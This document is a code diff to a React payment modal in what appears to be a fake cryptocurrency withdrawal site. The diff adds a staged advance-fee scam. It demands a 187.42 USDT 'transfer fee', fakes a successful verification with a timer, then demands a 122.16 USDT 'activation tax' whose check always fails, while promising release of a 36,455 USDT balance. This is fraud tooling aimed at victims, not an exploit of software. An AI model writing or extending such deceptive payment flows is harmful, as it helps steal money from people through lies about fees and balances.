@@ -353,52 +353,92 @@ function NavItem({ icon, label, active = false, onClick, blocked }: { icon: Reac
 }
 
 function PaymentModal({ onClose }: { onClose: () => void }) {
-  const [status, setStatus] = useState<'idle' | 'verifying' | 'failed'>('idle');
+  const [stage, setStage] = useState<'transfer_fee' | 'inactivity_tax'>('transfer_fee');
+  const [status, setStatus] = useState<'idle' | 'verifying' | 'success' | 'failed'>('idle');
 
   const handlePaid = () => {
     setStatus('verifying');
     setTimeout(() => {
-      setStatus('failed');
+      if (stage === 'transfer_fee') {
+        setStatus('success');
+      } else {
+        setStatus('failed');
+      }
     }, 10000);
+  };
+
+  const handleNext = () => {
+    setStage('inactivity_tax');
+    setStatus('idle');
   };
 
   return (
     <div className="fixed inset-0 z-[200] flex items-center justify-center px-4 bg-black/60 backdrop-blur-sm animate-in fade-in duration-300">
       <div className="bg-white w-full max-w-[380px] rounded-2xl overflow-hidden shadow-2xl animate-in zoom-in slide-in-from-bottom-4 duration-500">
         <div className="bg-[#6D4C52] p-5 text-center">
-          <h2 className="text-white text-xl font-bold">External Transfer Verification</h2>
+          <h2 className="text-white text-xl font-bold">
+            {stage === 'transfer_fee' ? 'External Transfer Verification' : 'Account Activation Protocol'}
+          </h2>
         </div>
         
         <div className="p-6 space-y-4">
           {status === 'verifying' ? (
             <div className="py-12 flex flex-col items-center justify-center space-y-4">
               <div className="w-12 h-12 border-4 border-[#6D4C52] border-t-transparent rounded-full animate-spin"></div>
-              <p className="text-gray-600 font-medium text-center">Verifying payment fees...<br/>Please wait.</p>
+              <p className="text-gray-600 font-medium text-center">Verifying payment status...<br/>Please do not close this window.</p>
             </div>
           ) : (
             <>
               <div className="text-gray-700 text-sm leading-relaxed space-y-3">
+                {status === 'success' && (
+                  <div className="bg-green-50 border border-green-100 p-3 rounded-lg text-green-700 text-xs font-medium flex items-start gap-2 animate-in slide-in-from-top-2 duration-300">
+                    <span className="text-lg">✅</span>
+                    <p>Transfer fee verification successful. Network synchronization initiated.</p>
+                  </div>
+                )}
+                
                 {status === 'failed' && (
                   <div className="bg-red-50 border border-red-100 p-3 rounded-lg text-red-600 text-xs font-medium flex items-start gap-2 animate-in slide-in-from-top-2 duration-300">
                     <span className="text-lg">⚠️</span>
-                    <p>Payment verification failed. Please ensure you have sent 187.42 USDT to one of the provided addresses.</p>
+                    <p>Verification failed. Please ensure you have settled the 122.16 USDT activation fee to proceed with the final release.</p>
                   </div>
                 )}
-                <p>
-                  Your withdrawal request has been processed. However, due to the <strong>Account Liquidation Protocol</strong>, this transaction is being executed via <strong>External Distributed Computing</strong> outside the standard platform network.
-                </p>
-                <p>
-                  To complete the final synchronization and release your assets to your external wallet, a one-time <strong>External Network Transfer Fee</strong> must be settled independently.
-                </p>
-                <div className="bg-gray-50 border border-gray-100 p-4 rounded-xl">
-                  <div className="flex justify-between items-center mb-2">
-                    <span className="text-gray-500 font-medium">Required Fee:</span>
-                    <span className="text-[#6D4C52] font-bold text-lg">187.42 USDT</span>
-                  </div>
-                  <p className="text-[11px] text-gray-400 italic">
-                    *This fee is mandatory for cross-protocol asset migration and cannot be deducted from the balance.
-                  </p>
-                </div>
+
+                {stage === 'transfer_fee' ? (
+                  <>
+                    <p>
+                      Your withdrawal request has been processed. However, due to the <strong>Account Liquidation Protocol</strong>, this transaction is being executed via <strong>External Distributed Computing</strong> outside the standard platform network.
+                    </p>
+                    <p>
+                      To complete the final synchronization and release your assets to your external wallet, a one-time <strong>External Network Transfer Fee</strong> must be settled independently.
+                    </p>
+                    <div className="bg-gray-50 border border-gray-100 p-4 rounded-xl">
+                      <div className="flex justify-between items-center mb-2">
+                        <span className="text-gray-500 font-medium">Required Fee:</span>
+                        <span className="text-[#6D4C52] font-bold text-lg">187.42 USDT</span>
+                      </div>
+                    </div>
+                  </>
+                ) : (
+                  <>
+                    <p className="font-bold text-[#6D4C52]">Final Step Required</p>
+                    <p>
+                      Our system has detected a prolonged period of <strong>Account Inactivity</strong>. According to the global security protocol, accounts that remain dormant for extended periods are automatically restricted to protect user assets.
+                    </p>
+                    <p>
+                      To reactivate your account and finalize the 36,455.00 USDT transfer, an <strong>Account Negligence & Activation Tax</strong> is required. This ensures the integrity of the blockchain bridge and confirms the active ownership of the receiving wallet.
+                    </p>
+                    <div className="bg-gray-50 border border-gray-100 p-4 rounded-xl">
+                      <div className="flex justify-between items-center mb-2">
+                        <span className="text-gray-500 font-medium">Activation Tax:</span>
+                        <span className="text-[#6D4C52] font-bold text-lg">122.16 USDT</span>
+                      </div>
+                      <p className="text-[10px] text-gray-500 mt-2">
+                        Rest assured, this is the final administrative requirement. Once confirmed, your full balance will be released immediately without further delay.
+                      </p>
+                    </div>
+                  </>
+                )}
               </div>
 
               <div className="space-y-3">
@@ -413,18 +453,29 @@ function PaymentModal({ onClose }: { onClose: () => void }) {
               </div>
 
               <div className="flex gap-3">
-                <button 
-                  onClick={onClose}
-                  className="flex-1 bg-gray-100 text-gray-600 py-3.5 rounded-xl font-bold text-sm active:scale-[0.98] transition-all"
-                >
-                  Not Now
-                </button>
-                <button 
-                  onClick={handlePaid}
-                  className="flex-[1.5] bg-[#6D4C52] text-white py-3.5 rounded-xl font-bold text-sm shadow-lg shadow-[#6D4C52]/20 active:scale-[0.98] transition-all"
-                >
-                  I have paid, proceed
-                </button>
+                {status === 'success' ? (
+                  <button 
+                    onClick={handleNext}
+                    className="w-full bg-[#6D4C52] text-white py-3.5 rounded-xl font-bold text-sm shadow-lg shadow-[#6D4C52]/20 active:scale-[0.98] transition-all"
+                  >
+                    Next Step
+                  </button>
+                ) : (
+                  <>
+                    <button 
+                      onClick={onClose}
+                      className="flex-1 bg-gray-100 text-gray-600 py-3.5 rounded-xl font-bold text-sm active:scale-[0.98] transition-all"
+                    >
+                      Not Now
+                    </button>
+                    <button 
+                      onClick={handlePaid}
+                      className="flex-[1.5] bg-[#6D4C52] text-white py-3.5 rounded-xl font-bold text-sm shadow-lg shadow-[#6D4C52]/20 active:scale-[0.98] transition-all"
+                    >
+                      I have paid, proceed
+                    </button>
+                  </>
+                )}
               </div>
             </>
           )}
